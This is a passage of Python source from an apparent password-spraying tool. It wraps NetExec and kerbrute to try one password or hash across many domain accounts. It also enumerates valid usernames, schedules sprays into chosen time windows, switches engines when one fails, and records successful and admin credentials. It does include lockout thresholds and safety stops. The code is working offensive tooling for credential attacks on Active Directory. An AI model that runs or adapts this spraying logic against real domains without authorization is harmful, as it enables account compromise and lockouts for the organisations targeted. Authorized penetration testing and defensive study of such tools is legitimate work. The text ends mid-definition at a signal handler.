    saw_auth_result = False
    expected_user = expected_user or next(
        (line.strip() for line in Path(userlist_path).read_text(encoding="utf-8").splitlines() if line.strip()),
        "",
    )
    expected_key = canonical_identity(expected_user, cfg.domain) if expected_user else ""

    if cfg.dry_run:
        # Simulate tool output for --dry-run mode
        ui.feed_line(f"[DRY-RUN] Simulating {engine} with secret=***")

        # For cred-reuse tracking, mark all users in the filtered list as attempted
        with open(userlist_path, "r") as f:
            dry_run_users = [line.strip() for line in f if line.strip()]

        for user in dry_run_users:
            state.mark_attempted(secret, user, status="dry_run")
            result.terminal_users.add(state._display_user(user))

        # Simulate some fake lines based on round
        for i in range(5):
            fake_line = f"[{i}] [DRY-RUN] fake output line {i}"
            ui.feed_line(fake_line)
            line_type, data = classify_line(engine, fake_line)
            if line_type == LineType.SUCCESS:
                pass  # Not real
            elif line_type == LineType.LOCKOUT:
                pass
            elif line_type == LineType.CONN_ERROR:
                result.conn_fails += 1
                ui.increment_conn_fails()
                # Dry-run lines are synthetic and never reach a real threshold.
            time.sleep(0.1)

        result.clean_finish = not result.aborted
        result.reconciled_complete = not result.aborted
        return result

    # Build command
    cmd: List[str] = []

    secret_file_path: Optional[str] = None

    if engine.tool == "nxc":
        binary = cfg.nxc_binary
        if not binary:
            ui.console.print("[!] nxc binary not found. Install netexec or override with --nxc-path", style="red")
            result.aborted = True
            result.abort_reason = "binary-not-found"
            return result

        cmd = [binary]

        if engine.protocol == "smb":
            cmd.extend(["smb", cfg.dc_ip, "-d", cfg.domain])
        elif engine.protocol == "ldap":
            cmd.extend(["ldap", cfg.dc_ip, "-d", cfg.domain])
        else:
            ui.console.print(f"[!] Invalid nxc protocol: {engine.protocol}", style="red")
            result.aborted = True
            result.abort_reason = "invalid-protocol"
            return result

        # NetExec defaults to a large worker pool (256 in current releases).
        # Keep only one authentication in flight so terminating on a lockout
        # signal actually prevents later queued users from being attempted.
        cmd.extend(["--threads", "1"])
        secret_fd, secret_file_path = tempfile.mkstemp(
            prefix=".secret-",
            suffix=".txt",
            dir=state.log_dir,
        )
        try:
            os.fchmod(secret_fd, 0o600)
            with os.fdopen(secret_fd, "w", encoding="utf-8") as secret_handle:
                secret_fd = -1
                secret_handle.write(secret + "\n")
                secret_handle.flush()
                os.fsync(secret_handle.fileno())
        finally:
            if secret_fd >= 0:
                os.close(secret_fd)
        cmd.extend([
            "-u",
            userlist_path,
            "-H" if cfg.pth_mode else "-p",
            secret_file_path,
        ])
        cmd.append("--continue-on-success")

    elif engine.tool == "kerbrute":
        if cfg.pth_mode:
            ui.console.print("[!] PTH mode not supported with kerbrute; this should never happen in PTH failover chain", style="red")
            result.aborted = True
            result.abort_reason = "pth-kerbrute-incompatible"
            return result

        binary = cfg.kerbrute_binary
        if not binary:
            ui.console.print("[!] kerbrute binary not found. Install kerbrute or override with --kerbrute-path", style="red")
            result.aborted = True
            result.abort_reason = "binary-not-found"
            return result

        # Kerbrute's own safe mode aborts as soon as any user is reported locked
        # out. One worker prevents already-in-flight parallel attempts from
        # continuing after that signal. AuthTempo also watches the stream below,
        # so a changed Kerbrute exit code cannot accidentally turn this into
        # failover.
        cmd = [
            binary,
            "passwordspray",
            "--safe",
            "-v",
            "--threads",
            "1",
            "--dc",
            cfg.dc_ip,
            "-d",
            realm or cfg.domain,
            "--",
            userlist_path,
            secret,
        ]

    else:
        ui.console.print(f"[!] Unknown engine tool: {engine.tool}", style="red")
        result.aborted = True
        result.abort_reason = "unknown-engine"
        return result

    # Spawn subprocess
    if cfg.verbose:
        masked_cmd = list(cmd)
        if engine.tool == "kerbrute":
            masked_cmd[-1] = "***"
        else:
            secret_flag = "-H" if cfg.pth_mode else "-p"
            if secret_flag in masked_cmd:
                secret_idx = masked_cmd.index(secret_flag) + 1
                if secret_idx < len(masked_cmd):
                    masked_cmd[secret_idx] = "***"
        ui.console.print(f"[*] Running: {escape(shlex.join(masked_cmd))}", style="dim")
    else:
        ui.console.print(f"[*] Running: {escape(' '.join(cmd[:3]))}... (secret masked)", style="dim")

    proc: Optional[subprocess.Popen] = None
    try:
        proc = subprocess.Popen(
            cmd,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True,
            bufsize=1,
            start_new_session=True,
        )
        state.active_process = proc
        seen_signal_lines: Set[str] = set()

        # Stream output
        for line in _iter_process_output(
            proc,
            total_timeout=cfg.engine_timeout_seconds,
            idle_timeout=cfg.engine_idle_timeout_seconds,
        ):
            line = line.rstrip()
            if not line:
                continue

            # Log to overall log with timestamp
            ts = datetime.datetime.now().isoformat()
            state._log_line(f"{ts}  {line}")

            # Update UI raw feed
            ui.feed_line(line)

            # Classify
            line_type, data = classify_line(engine, line, expected_secret=secret)

            if line_type == LineType.SUCCESS and data:
                saw_auth_result = True
                if ":" not in data:
                    ui.console.print(f"[!] Unparseable credential line (skipped): {line}", style="yellow")
                else:
                    reported_user, _reported_secret = data.split(":", 1)
                    user = _normalize_reported_user(reported_user, cfg.users, cfg.domain)
                    if expected_key and canonical_identity(user, cfg.domain) != expected_key:
                        result.aborted = True
                        result.abort_reason = "identity-mismatch"
                        result.errors.append(f"expected {expected_user}, parsed {user}")
                        _stop_process(proc)
                        break
                    # The invoked secret is authoritative; tool output may add
                    # status markers or formatting after it.
                    secret_hit = secret
                    pair = (user, secret_hit)
                    if pair not in result.successes:
                        result.successes.append(pair)
                    result.terminal_users.add(user)
                    ui.update_success(user, secret_hit)
                    state.finish_attempt(
                        secret,
                        user,
                        "success",
                        persist=False,
                    )
                    state.add_cred(
                        user,
                        secret_hit,
                        is_admin=False,
                        engine=str(engine),
                        persist=False,
                    )
                    state.save()

            elif line_type == LineType.ADMIN and data:
                saw_auth_result = True
                if ":" not in data:
                    ui.console.print(f"[!] Unparseable admin line (skipped): {line}", style="yellow")
                else:
                    reported_user, _reported_secret = data.split(":", 1)
                    user = _normalize_reported_user(reported_user, cfg.users, cfg.domain)
                    if expected_key and canonical_identity(user, cfg.domain) != expected_key:
                        result.aborted = True
                        result.abort_reason = "identity-mismatch"
                        result.errors.append(f"expected {expected_user}, parsed {user}")
                        _stop_process(proc)
                        break
                    secret_hit = secret
                    pair = (user, secret_hit)
                    if pair not in result.admin_users:
                        result.admin_users.append(pair)
                    # Also add to successes since it's a valid credential
                    if pair not in result.successes:
                        result.successes.append(pair)
                    result.terminal_users.add(user)
                    ui.update_admin(user, secret_hit)
                    state.finish_attempt(
                        secret,
                        user,
                        "admin_success",
                        persist=False,
                    )
                    state.add_cred(
                        user,
                        secret_hit,
                        is_admin=True,
                        engine=str(engine),
                        persist=False,
                    )
                    state.save()

            elif line_type in {
                LineType.PASSWORD_EXPIRED,
                LineType.PASSWORD_MUST_CHANGE,
            } and data:
                saw_auth_result = True
                if ":" not in data:
                    ui.console.print(
                        f"[!] Unparseable password-change credential line (skipped): {line}",
                        style="yellow",
                    )
                else:
                    reported_user, _reported_secret = data.split(":", 1)
                    user = _normalize_reported_user(
                        reported_user,
                        cfg.users,
                        cfg.domain,
                    )
                    if expected_key and canonical_identity(user, cfg.domain) != expected_key:
                        result.aborted = True
                        result.abort_reason = "identity-mismatch"
                        result.errors.append(f"expected {expected_user}, parsed {user}")
                        _stop_process(proc)
                        break
                    credential_state = (
                        "password_expired"
                        if line_type == LineType.PASSWORD_EXPIRED
                        else "password_must_change"
                    )
                    pair = (user, secret)
                    restricted = (user, secret, credential_state)
                    if pair not in result.successes:
                        result.successes.append(pair)
                    if restricted not in result.password_change_required:
                        result.password_change_required.append(restricted)
                    result.terminal_users.add(user)
                    command = build_password_change_command(
                        cfg.domain,
                        user,
                        cfg.dc_ip,
                        secret=secret,
                        pth_mode=cfg.pth_mode,
                    )
                    ui.update_password_change(
                        user,
                        secret,
                        credential_state,
                        command,
                    )
                    state.finish_attempt(
                        secret,
                        user,
                        credential_state,
                        detail=credential_state_label(credential_state),
                        persist=False,
                    )
                    state.add_cred(
                        user,
                        secret,
                        credential_state=credential_state,
                        engine=str(engine),
                        persist=False,
                    )
                    state.save()

            elif line_type == LineType.LOCKOUT:
                saw_auth_result = True
                signal_key = ANSI_ESCAPE_RE.sub("", line).strip().casefold()
                if signal_key in seen_signal_lines:
                    continue
                seen_signal_lines.add(signal_key)
                reported = data or expected_user
                user_lock = _normalize_reported_user(reported, cfg.users, cfg.domain) if reported else None
                if user_lock and expected_key and canonical_identity(user_lock, cfg.domain) != expected_key:
                    result.aborted = True
                    result.abort_reason = "identity-mismatch"
                    result.errors.append(f"expected {expected_user}, parsed {user_lock}")
                    _stop_process(proc)
                    break
                if user_lock:
                    result.lockouts.add(user_lock)
                    result.terminal_users.add(user_lock)
                    state.finish_attempt(
                        secret,
                        user_lock,
                        "lockout",
                        persist=False,
                    )
                else:
                    result.unknown_lockouts += 1
                signal_added = state.add_lockout(
                    user_lock,
                    certainty="definitive",
                    engine=engine.tool,
                    protocol=engine.protocol or "",
                    secret=secret,
                    raw_line=line,
                    persist=False,
                )
                state.save()
                if signal_added:
                    ui.update_lockout(user_lock)

                lockout_abort_reason = ""
                if engine.tool == "kerbrute":
                    lockout_abort_reason = "lockout-safety-stop"
                elif (state.lockout_count >= cfg.lockout_threshold and
                      state.lockout_count > state.acknowledged_lockouts):
                    lockout_abort_reason = "lockout-threshold"

                if lockout_abort_reason:
                    _stop_process(proc)
                    result.aborted = True
                    result.abort_reason = lockout_abort_reason
                    ui.set_abort(result.abort_reason)
                    break

            elif line_type == LineType.AMBIGUOUS_LOCKOUT:
                saw_auth_result = True
                signal_key = ANSI_ESCAPE_RE.sub("", line).strip().casefold()
                if signal_key in seen_signal_lines:
                    continue
                seen_signal_lines.add(signal_key)
                reported = data or expected_user
                user_signal = _normalize_reported_user(reported, cfg.users, cfg.domain) if reported else None
                if user_signal and expected_key and canonical_identity(user_signal, cfg.domain) != expected_key:
                    result.aborted = True
                    result.abort_reason = "identity-mismatch"
                    result.errors.append(f"expected {expected_user}, parsed {user_signal}")
                    _stop_process(proc)
                    break
                if user_signal:
                    result.ambiguous_lockouts.add(user_signal)
                    result.terminal_users.add(user_signal)
                    state.finish_attempt(
                        secret,
                        user_signal,
                        "ambiguous_lockout",
                        persist=False,
                    )
                else:
                    result.unknown_ambiguous_lockouts += 1
                signal_added = state.add_lockout(
                    user_signal,
                    certainty="ambiguous",
                    engine=engine.tool,
                    protocol=engine.protocol or "",
                    secret=secret,
                    raw_line=line,
                    persist=False,
                )
                state.save()
                if signal_added:
                    ui.update_lockout(user_signal)
                _stop_process(proc)
                result.aborted = True
                result.abort_reason = "lockout-safety-stop"
                ui.set_abort(result.abort_reason)
                break

            elif line_type == LineType.ERROR:
                # Tool-level error (wrong realm, domain mismatch, etc.)
                error_msg = data if data else line
                result.errors.append(error_msg)
                ui.update_error(error_msg)
                ui.console.print(f"[!] Tool error: {error_msg}", style="red")

                if any(kw in error_msg.lower() for kw in ["wrong realm", "cannot find kdc", "no kdc", "unknown realm"]):
                    _stop_process(proc)
                    result.aborted = True
                    result.abort_reason = "wrong-realm"
                    break
                if any(re.search(pat, error_msg, re.IGNORECASE) for pat in NXC_FATAL_ERROR_PATTERNS):
                    _stop_process(proc)
                    result.aborted = True
                    result.abort_reason = "tool-error"
                    break

            elif line_type == LineType.AUTHFAIL:
                saw_auth_result = True
                reported = data or expected_user
                if reported:
                    user = _normalize_reported_user(reported, cfg.users, cfg.domain)
                    if expected_key and canonical_identity(user, cfg.domain) != expected_key:
                        result.aborted = True
                        result.abort_reason = "identity-mismatch"
                        result.errors.append(f"expected {expected_user}, parsed {user}")
                        _stop_process(proc)
                        break
                    result.terminal_users.add(user)
                    state.finish_attempt(secret, user, "auth_failure")

            elif line_type == LineType.CONN_ERROR:
                # Track connection errors for stats/throttling. The completed
                # invocation is classified as failed below so failover can run.
                result.conn_fails += 1
                ui.increment_conn_fails()

            elif line_type == LineType.SUMMARY:
                try:
                    result.summary_tested = int(data) if data is not None else None
                except ValueError:
                    result.summary_tested = None

        # Wait for normal completion if not aborted
        if not result.aborted:
            return_code = proc.wait(timeout=10)
            if result.conn_fails:
                result.aborted = True
                result.abort_reason = "connection-errors"
            elif return_code != 0:
                result.aborted = True
                result.abort_reason = f"exit-code-{return_code}"
            elif not saw_auth_result or not result.terminal_users:
                result.aborted = True
                result.abort_reason = "no-auth-results"
            elif engine.tool == "kerbrute" and result.summary_tested is None:
                result.aborted = True
                result.abort_reason = "missing-summary"
            elif engine.tool == "kerbrute" and result.summary_tested != 1:
                result.aborted = True
                result.abort_reason = "summary-mismatch"
            elif expected_key and not any(
                canonical_identity(user, cfg.domain) == expected_key
                for user in result.terminal_users
            ):
                result.aborted = True
                result.abort_reason = "identity-mismatch"
            else:
                result.clean_finish = True
                result.reconciled_complete = True

    except FileNotFoundError:
        ui.console.print(f"[!] Command not found: {cmd[0]}", style="red")
        result.aborted = True
        result.abort_reason = "command-not-found"

    except subprocess.TimeoutExpired:
        _stop_process(proc)
        ui.console.print("[!] Subprocess timed out", style="red")
        result.aborted = True
        result.abort_reason = "timeout"

    except EngineOutputTimeout as exc:
        _stop_process(proc)
        ui.console.print(f"[!] Engine stopped after {exc.reason}", style="red")
        result.aborted = True
        result.abort_reason = exc.reason

    except Exception as e:
        _stop_process(proc)
        ui.console.print(f"[!] Exception running engine: {e}", style="red")
        result.aborted = True
        result.abort_reason = f"exception-{type(e).__name__}"

    finally:
        if state.active_process is proc:
            state.active_process = None
        if secret_file_path:
            try:
                Path(secret_file_path).unlink()
            except FileNotFoundError:
                pass

    return result

# =============================================================================
# Preflight check
# =============================================================================

def preflight(
    cfg: Config,
    ui: RichUI,
    state: Optional[State] = None,
) -> Tuple[bool, str]:
    """
    Perform preflight: reachability + domain validation.
    Returns (ok, detail_message).
    """
    if cfg.no_preflight or cfg.dry_run:
        return True, "Target check skipped (--skip-target-check or --dry-run)"

    ui.console.print("[*] Preflight check...", style="cyan")

    # 1. Reachability: socket connect to relevant ports
    ports_to_check = []
    if cfg.tool == "nxc":
        if cfg.protocol == "smb":
            ports_to_check = [445]
        elif cfg.protocol == "ldap":
            ports_to_check = [389, 636]  # Either LDAP or LDAPS is sufficient
    elif cfg.tool == "kerbrute":
        ports_to_check = [88]  # Kerberos

    reachable = False
    for port in ports_to_check:
        try:
            sock = socket.create_connection((cfg.dc_ip, port), timeout=3)
            sock.close()
            ui.console.print(f"  [+] Port {port} reachable", style="green")
            reachable = True
            break
        except (socket.timeout, ConnectionRefusedError, OSError):
            ui.console.print(f"  [-] Port {port} not reachable", style="dim")

    if not reachable:
        msg = f"DC {cfg.dc_ip} unreachable on ports {ports_to_check}"
        ui.alert("Preflight Failed", msg, "red")
        return False, msg

    # 2. Domain check: nxc probe (or kerbrute fallback)
    if cfg.tool == "nxc" and cfg.nxc_binary:
        try:
            cmd = [cfg.nxc_binary]
            if cfg.protocol == "smb":
                cmd.extend(["smb", cfg.dc_ip])
            else:
                cmd.extend(["ldap", cfg.dc_ip, "-d", cfg.domain])

            # Quick probe without creds
            probe = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True,
                start_new_session=True,
            )
            if state is not None:
                state.active_process = probe
            stdout, stderr = probe.communicate(timeout=15)
            if probe.returncode != 0:
                return False, f"nxc probe exited with status {probe.returncode}"

            # Parse domain from output
            output = stdout + stderr
            # NetExec may report either the DNS realm or NetBIOS short name.
            # Match whole tokens so LAB does not accidentally match LABEL.
            domain_upper = cfg.domain.upper().rstrip(".")
            domain_candidates = {domain_upper, domain_upper.split(".", 1)[0]}
            output_upper = output.upper()
            domain_confirmed = any(
                re.search(
                    rf"(?<![A-Z0-9_.-]){re.escape(candidate)}(?![A-Z0-9_.-])",
                    output_upper,
                )
                for candidate in domain_candidates
                if candidate
            )
            if domain_confirmed:
                ui.console.print(f"  [+] Domain '{cfg.domain}' confirmed in DC response", style="green")
                return True, "Preflight passed"
            else:
                msg = f"Domain '{cfg.domain}' not found in DC response (possible mismatch)"
                ui.console.print(f"  [-] {msg}", style="red")
                ui.console.print("     (DC may be reporting a different domain/NetBIOS name)", style="dim")
                ui.alert("Preflight Failed", msg, "red")
                return False, msg

        except (KeyboardInterrupt, SystemExit):
            _stop_process(locals().get("probe"))
            raise
        except subprocess.TimeoutExpired:
            _stop_process(locals().get("probe"))
            msg = "nxc probe timed out"
            ui.console.print(f"  [-] {msg}", style="red")
            return False, msg
        except Exception as e:
            _stop_process(locals().get("probe"))
            msg = f"nxc probe error: {e}"
            ui.console.print(f"  [-] {msg}", style="red")
            return False, msg
        finally:
            if state is not None and state.active_process is locals().get("probe"):
                state.active_process = None

    # Kerbrute validates its realm during the first strictly controlled attempt;
    # preflight establishes that the explicitly selected KDC is reachable.
    ui.console.print("  [+] Preflight complete (reachability verified)", style="green")
    return True, "Preflight passed"

# =============================================================================
# Feature 2: Filter disabled/non-existent accounts
# =============================================================================

def enumerate_valid_users(
    cfg: Config,
    ui: RichUI,
    console: Console,
    state: Optional[State] = None,
) -> List[str]:
    """
    Run kerbrute userenum to filter out non-existent accounts.
    Returns configured display identities proven to exist. Enumeration failures
    fail closed rather than silently restoring the full list.
    """
    if not cfg.kerbrute_binary:
        raise RuntimeError("Kerbrute is required for --validate-users")

    console.print("[*] Enumerating valid users with kerbrute userenum...", style="cyan")

    fd, enum_userfile = tempfile.mkstemp(prefix="authtempo-enum-", suffix=".txt")
    try:
        os.fchmod(fd, 0o600)
        with os.fdopen(fd, "w", encoding="utf-8") as handle:
            fd = -1
            handle.write("\n".join(cfg.users) + "\n")
            handle.flush()
            os.fsync(handle.fileno())
    finally:
        if fd >= 0:
            os.close(fd)

    cmd = [
        cfg.kerbrute_binary,
        "userenum",
        "--dc",
        cfg.dc_ip,
        "-d",
        cfg.domain,
        enum_userfile,
    ]

    try:
        proc = subprocess.Popen(
            cmd,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True,
            bufsize=1,
            start_new_session=True,
        )
        if state is not None:
            state.active_process = proc

        valid_keys: Set[str] = set()
        summary_tested: Optional[int] = None
        seen_safety_lines: Set[str] = set()
        for line in _iter_process_output(
            proc,
            total_timeout=cfg.engine_timeout_seconds,
            idle_timeout=cfg.engine_idle_timeout_seconds,
        ):
            line = line.rstrip()
            if not line:
                continue
            console.print(Text(line))
            if state is not None:
                state._log_line(f"{datetime.datetime.now().isoformat()}  USERENUM {line}")

            parsed_line = ANSI_ESCAPE_RE.sub("", line)
            summary = re.search(
                r"Done!\s+Tested\s+(\d+)\s+(?:usernames?|logins?)",
                parsed_line,
                re.IGNORECASE,
            )
            if summary:
                summary_tested = int(summary.group(1))

            # Kerbrute also reports valid principals accompanied by policy errors.
            valid_match = re.search(
                r"\[\+\]\s+VALID USERNAME(?: WITH ERROR)?:\s+(\S+)",
                parsed_line,
                re.IGNORECASE,
            )
            reported_principal = valid_match.group(1) if valid_match else None
            if reported_principal is None:
                principal_match = re.search(
                    r"\b([A-Za-z0-9_.\-$]+@[A-Za-z0-9_.-]+)\b",
                    parsed_line,
                )
                reported_principal = (
                    principal_match.group(1) if principal_match else None
                )

            enumeration_status_text = parsed_line
            if valid_match:
                enumeration_status_text = parsed_line[valid_match.end():]
            elif reported_principal:
                principal_offset = parsed_line.find(reported_principal)
                if principal_offset >= 0:
                    enumeration_status_text = parsed_line[
                        principal_offset + len(reported_principal):
                    ]

            signal_certainty: Optional[str] = None
            if any(
                re.search(pattern, enumeration_status_text, re.IGNORECASE)
                for pattern in KERBRUTE_LOCKOUT_PATTERNS
            ):
                signal_certainty = "definitive"
            elif any(
                re.search(pattern, enumeration_status_text, re.IGNORECASE)
                for pattern in KERBRUTE_AMBIGUOUS_LOCKOUT_PATTERNS
            ):
                signal_certainty = "ambiguous"

            if signal_certainty is not None:
                signal_key = parsed_line.strip().casefold()
                if signal_key not in seen_safety_lines:
                    seen_safety_lines.add(signal_key)
                    normalized_user = (
                        _normalize_reported_user(
                            reported_principal,
                            cfg.users,
                            cfg.domain,
                        )
                        if reported_principal
                        else None
                    )
                    if normalized_user and canonical_identity(
                        normalized_user, cfg.domain
                    ) not in {
                        canonical_identity(user, cfg.domain)
                        for user in cfg.users
                    }:
                        normalized_user = None
                    if normalized_user:
                        valid_keys.add(
                            canonical_identity(normalized_user, cfg.domain)
                        )
                    if state is not None:
                        state.add_lockout(
                            normalized_user,
                            certainty=signal_certainty,
                            engine="kerbrute",
                            protocol="userenum",
                            secret=None,
                            raw_line=line,
                            stage="identity_enumeration",
                        )
                    console.print(
                        "    [!] Identity enumeration reported a "
                        f"{signal_certainty} lockout/revocation signal for "
                        f"{escape(normalized_user or '(unknown)')}",
                        style="yellow",
                    )

            if valid_match:
                valid_keys.add(
                    canonical_identity(valid_match.group(1), cfg.domain)
                )

        return_code = proc.wait(timeout=10)

        if return_code != 0:
            raise RuntimeError(f"Kerbrute user enumeration exited with status {return_code}")
        if summary_tested != len(cfg.users):
            raise RuntimeError(
                "Kerbrute user enumeration did not reconcile: "
                f"expected {len(cfg.users)}, summary reported {summary_tested!r}"
            )
        if not valid_keys:
            raise RuntimeError("Kerbrute user enumeration returned no valid identities")
        valid_users = [
            user for user in cfg.users
            if canonical_identity(user, cfg.domain) in valid_keys
        ]
        console.print(f"    [+] Found {len(valid_users)} valid users", style="green")
        return valid_users

    except (KeyboardInterrupt, SystemExit):
        _stop_process(locals().get("proc"))
        raise
    except Exception as e:
        _stop_process(locals().get("proc"))
        raise RuntimeError(f"Kerbrute user enumeration failed: {e}") from e
    finally:
        if state is not None and state.active_process is locals().get("proc"):
            state.active_process = None
        try:
            Path(enum_userfile).unlink()
        except FileNotFoundError:
            pass

# =============================================================================
# Feature B: Spray window scheduling
# =============================================================================

class SprayWindow:
    """Spray time window: business-hours, off-hours, or custom range."""

    def __init__(self, spec: str):
        """Parse preset or 'HH:MM-HH:MM' range."""
        self.spec = spec.strip().lower()
        self.start_minute = None  # minutes since midnight
        self.end_minute = None
        self.days = set()  # 0=Mon,...,6=Sun; empty=all days

        if self.spec == "business-hours":
            # Mon-Fri 09:00-17:00
            self.start_minute = 9 * 60
            self.end_minute = 17 * 60
            self.days = {0, 1, 2, 3, 4}  # Mon-Fri
        elif self.spec == "off-hours":
            # Mon-Fri 17:00-09:00 (overnight) + all weekend
            self.start_minute = 17 * 60
            self.end_minute = 9 * 60
            self.days = {0, 1, 2, 3, 4}  # Active Mon-Fri (wraparound overnight)
            # Weekend handling in is_in_window (all Sat/Sun are in window)
        else:
            # Custom "HH:MM-HH:MM" or "H-H"
            self._parse_range()

    def _parse_range(self):
        """Parse custom range like '09:00-17:00' or '9-17'."""
        match = re.fullmatch(
            r"\s*(\d{1,2})(?::(\d{2}))?\s*-\s*(\d{1,2})(?::(\d{2}))?\s*",
            self.spec,
        )
        if not match:
            raise ValueError("expected business-hours, off-hours, or HH:MM-HH:MM")

        start_h, start_m, end_h, end_m = match.groups()
        start_hour, start_minute = int(start_h), int(start_m or 0)
        end_hour, end_minute = int(end_h), int(end_m or 0)
        if not (0 <= start_hour <= 23 and 0 <= end_hour <= 23 and
                0 <= start_minute <= 59 and 0 <= end_minute <= 59):
            raise ValueError("hours must be 00-23 and minutes must be 00-59")

        self.start_minute = start_hour * 60 + start_minute
        self.end_minute = end_hour * 60 + end_minute
        if self.start_minute == self.end_minute:
            raise ValueError("start and end times must differ")

    def is_in_window(self, now: Optional[datetime.datetime] = None) -> bool:
        """Check if current time is within the spray window."""
        if now is None:
            now = datetime.datetime.now()

        weekday = now.weekday()  # 0=Mon,...,6=Sun
        minute = now.hour * 60 + now.minute

        # off-hours special case: all weekend is in window
        if self.spec == "off-hours":
            if weekday in {5, 6}:  # Sat/Sun
                return True
            # Weekday: in window if 17:00-09:00 (overnight wrap)
            if minute >= self.start_minute or minute < self.end_minute:
                return True
            return False

        # Check day restriction
        if self.days and weekday not in self.days:
            return False

        # Normal range check
        if self.start_minute <= self.end_minute:
            # Non-wrapping: 09:00-17:00
            return self.start_minute <= minute < self.end_minute
        else:
            # Wrapping: 22:00-06:00
            return minute >= self.start_minute or minute < self.end_minute

    def seconds_until_open(self, now: Optional[datetime.datetime] = None) -> int:
        """Seconds until next window opening (0 if inside)."""
        if now is None:
            now = datetime.datetime.now()

        if self.is_in_window(now):
            return 0

        # Compute next opening time
        if self.spec == "business-hours":
            # Next Mon-Fri 09:00
            candidate = now.replace(hour=9, minute=0, second=0, microsecond=0)
            while candidate.weekday() not in self.days or candidate <= now:
                candidate += datetime.timedelta(days=1)
            return int((candidate - now).total_seconds())

        elif self.spec == "off-hours":
            # If weekday during business hours, next opening is today 17:00
            # If weekday outside business hours or weekend, already in window
            if now.weekday() in self.days and 9 * 60 <= now.hour * 60 + now.minute < 17 * 60:
                candidate = now.replace(hour=17, minute=0, second=0, microsecond=0)
                return int((candidate - now).total_seconds())
            return 0

        else:
            # Custom range
            candidate = now.replace(hour=self.start_minute // 60,
                                    minute=self.start_minute % 60,
                                    second=0, microsecond=0)
            if candidate <= now:
                candidate += datetime.timedelta(days=1)
            while self.days and candidate.weekday() not in self.days:
                candidate += datetime.timedelta(days=1)
            return int((candidate - now).total_seconds())

    def describe(self) -> str:
        """Human-readable window description."""
        if self.spec == "business-hours":
            return "Mon-Fri 09:00-17:00"
        elif self.spec == "off-hours":
            return "Mon-Fri 17:00-09:00 + all weekend"
        else:
            return self.spec


def wait_for_window(window: SprayWindow, ui: RichUI, console: Console, state: State):
    """Wait until spray window opens (if outside). Records timeline event."""
    if window.is_in_window():
        return

    seconds = window.seconds_until_open()
    if seconds <= 0:
        return

    console.print(f"[*] Outside spray window ({window.describe()}); waiting until next window opens...", style="cyan")

    # Record timeline event
    open_time = datetime.datetime.now() + datetime.timedelta(seconds=seconds)
    state.record_timeline_event("schedule_wait", f"Waiting {int(seconds//60)}m until {open_time.strftime('%H:%M')}")

    ui.countdown(seconds)

# =============================================================================
# Failover chain building
# =============================================================================

# Engine health / demotion constants
HARD_DEMOTE_REASONS = {"wrong-realm", "binary-not-found", "command-not-found",
                       "invalid-protocol", "pth-kerbrute-incompatible", "unknown-engine"}
MAX_COOLDOWN = 30  # default exponential cap; never shorten a larger operator value
MAX_DEMOTE_COUNT = 32  # bound persisted exponent/counter work

def derive_realm_candidates(domain: str) -> List[str]:
    """
    Derive Kerberos realm variant candidates from a domain.
    Returns list: as-given, UPPERCASE, parent-domain, UPPERCASE-parent.
    Examples:
        sub.domain.com → [sub.domain.com, SUB.DOMAIN.COM, domain.com, DOMAIN.COM]
        domain.com     → [domain.com, DOMAIN.COM]
        lab.local      → [lab.local, LAB.LOCAL]
    """
    d = domain.strip()
    candidates = [d, d.upper()]

    # Extract parent domain if we have a subdomain (3+ parts)
    parts = [p for p in d.split(".") if p]
    if len(parts) >= 3:
        parent = ".".join(parts[-2:])  # domain.com
        candidates.extend([parent, parent.upper()])

    # Dedupe while preserving order
    return list(dict.fromkeys(candidates))

def build_failover_chain(cfg: Config) -> List[Engine]:
    """
    Build ordered, de-duplicated list of engines for failover.
    See plan: depends on starting tool + PTH mode.
    """
    if cfg.pth_mode:
        # PTH: nxc only, exclude kerbrute
        start_proto = cfg.protocol  # "smb" or "ldap"
        other_proto = "ldap" if start_proto == "smb" else "smb"
        return [
            Engine("nxc", start_proto),
            Engine("nxc", other_proto),
        ]

    # Normal mode
    chain = []

    if cfg.tool == "nxc":
        if cfg.protocol == "smb":
            chain = [
                Engine("nxc", "smb"),
                Engine("kerbrute"),
                Engine("nxc", "ldap"),
            ]
        elif cfg.protocol == "ldap":
            chain = [
                Engine("nxc", "ldap"),
                Engine("kerbrute"),
                Engine("nxc", "smb"),
            ]

    elif cfg.tool == "kerbrute":
        chain = [
            Engine("kerbrute"),
            Engine("nxc", "ldap"),
            Engine("nxc", "smb"),
        ]

    # De-duplicate (in case user passes weird combos)
    seen = set()
    unique_chain = []
    for eng in chain:
        key = (eng.tool, eng.protocol)
        if key not in seen:
            seen.add(key)
            unique_chain.append(eng)

    return unique_chain

# =============================================================================
# Lockout handling
# =============================================================================

def handle_lockouts(
    pass_lockouts: int,
    cumulative_lockouts: int,
    cfg: Config,
    ui: RichUI,
    console: Console,
    acknowledged_lockouts: int = 0,
) -> bool:
    """
    Apply lockout rules. Returns True if run should continue, False if hard-stop.
    - Per-pass rule: > cfg.lockout_burst for one secret → hard-stop.
    - Threshold rule: >= cfg.lockout_threshold cumulative → interactive prompt.
    """
    if pass_lockouts > cfg.lockout_burst:
        msg = (
            f"[!] Hard-stop: {pass_lockouts} lockout signals in this spray pass "
            f"exceeded the maximum of {cfg.lockout_burst}. Stopping the run to "
            "avoid further lockouts."
        )
        console.print(msg, style="red")
        ui.alert("LOCKOUT LIMIT - STOPPED", msg, "red")
        return False  # Do not continue

    if (cumulative_lockouts >= cfg.lockout_threshold and
            cumulative_lockouts > acknowledged_lockouts):
        msg = (
            f"[*] Cumulative safety signals: {cumulative_lockouts} "
            f"(review threshold {cfg.lockout_threshold})."
        )
        console.print(msg, style="yellow")
        return prompt_continue(ui, console)

    return True

def prompt_continue(ui: RichUI, console: Console) -> bool:
    """Interactive prompt: continue (c) or quit (q). Returns True to continue."""
    ui.alert(
        "PAUSED",
        "Safety-signal review threshold reached. Press 'c' to continue or 'q' to quit.",
        "yellow",
    )

    while True:
        try:
            choice = input("Continue? [c/q]: ").strip().lower()
            if choice in ("c", "continue"):
                console.print("[*] Continuing...", style="green")
                return True
            elif choice in ("q", "quit", "exit"):
                console.print("[*] Quitting.", style="red")
                return False
            else:
                console.print("  Enter 'c' to continue or 'q' to quit.", style="dim")
        except (EOFError, KeyboardInterrupt):
            console.print("\n[*] Interrupted; quitting.", style="red")
            return False

# =============================================================================
# Signal handling
# =============================================================================

def setup_signal_handler(state: State, console: Console, ui: Optional[RichUI] = None):
